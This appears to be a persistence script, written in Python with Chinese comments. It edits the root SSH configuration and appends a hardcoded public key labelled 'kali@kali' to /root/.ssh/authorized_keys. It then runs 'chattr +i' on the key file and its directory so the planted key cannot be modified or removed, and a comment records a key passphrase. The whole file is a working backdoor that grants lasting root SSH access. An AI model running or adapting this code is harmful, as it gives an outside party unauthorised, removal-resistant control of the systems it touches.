# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import os


def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def miyue(new_content):
    filename = "/etc/ssh/sshd_config"
    with open(filename, 'a') as file:
        file.write(new_content + '\n')


def authorized_keys(new_content):
    ssh_dir = "/root/.ssh"
    authorized_keys_file = "/root/.ssh/authorized_keys"
    # 创建.ssh目录（如果不存在）
    if not os.path.exists(ssh_dir):
        os.makedirs(ssh_dir)
    # 创建authorized_keys文件（如果不存在）
    if not os.path.exists(authorized_keys_file):
        with open(authorized_keys_file, 'w') as file:
            pass  # 创建一个空文件
    # 将新内容追加到authorized_keys文件末尾
    with open(authorized_keys_file, 'a') as file:
        file.write(new_content + '\n')


def file_key():
    file_path = "/root/.ssh/authorized_keys"
    if os.path.exists(file_path):
        print("文件写入成功")
    else:
        print("文件写入失败")


if __name__ == '__main__':
    id_ed25519_pub = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDvfxeBxW8qqV4wfyMBylxVDyd/Cq9N8psk2zpwDf9SX kali@kali"
    # 调用 miyue 函数来在文件末尾写入新内容
    # ssh-keygen -t ed25519 -N "admin!@#45123"
    miyue("HostKey /etc/ssh/ssh_host_ed25519_key")
    miyue("PubkeyAuthentication yes")
    miyue("AuthorizedKeysFile .ssh/authorized_keys")
    authorized_keys(id_ed25519_pub)
    ml('chattr +i /root/.ssh && chattr +i /root/.ssh/authorized_keys')
    file_key()
